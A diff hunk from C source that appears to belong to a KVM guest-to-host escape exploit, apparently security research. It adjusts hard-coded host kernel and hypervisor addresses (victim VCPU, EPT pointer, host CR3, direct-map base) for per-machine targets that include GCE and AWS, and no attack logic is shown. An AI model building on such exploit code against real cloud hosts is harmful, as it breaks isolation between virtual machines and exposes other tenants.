@@ -239,27 +239,28 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 #if LEAK == SKIP || HELPERS
 
 #if MACHINE == FATHER
-#define BASE		0x2dd2ae218
+#define BASE		0x2dd2ae218UL
 #define HOST_DIRECT_MAP	0xffffa03300000000
 #define OWN_VCPU	0xffffa03509eea300
 #define OWN_TASK	0xffffa0340565afb0
-#define HCR3		0x426d18000
+#define HCR3		0x426d18000UL
 #define OWN_KVM		0xffffb1b08d9f5000
 #define VICTIM_KVM	0xffffb1b08ef31000
 #define VICTIM_VCPU	0xffffa03509694600
-#define EPTP		0x10209e000
+#define EPTP		0x10209e000UL
+#define GCR3            0x279a42000UL
 #define GTEXT		0xffffffffa7c00000
-#define INIT_COMM	0x34f211e68
-#define NGINX		0x1f93dc100
+#define INIT_COMM	0x34f211e68UL
+// #define NGINX		0x1f93dc100
 #elif MACHINE == GCE
-#define BASE		0x88d43f218
+#define BASE		0x88d43f218UL
 #define HOST_DIRECT_MAP	0xffff934040000000
 #define OWN_VCPU	0xffff9352eff70e40
 #define OWN_TASK	0xffff936a91dba000
-#define HCR3		0x111cf6000
+#define HCR3		0x111cf6000UL
 #define OWN_KVM		0xffff9584f2d71000
 #elif MACHINE == AWS
-#define BASE		0xa1d35218ULL
+#define BASE		0xa1d35218UL
 // #define HOST_DIRECT_MAP	0xffff93e3c0000000
 // #define OWN_VCPU	0xffff93e461290000
 // #define 		0xffff93e46128b2a0
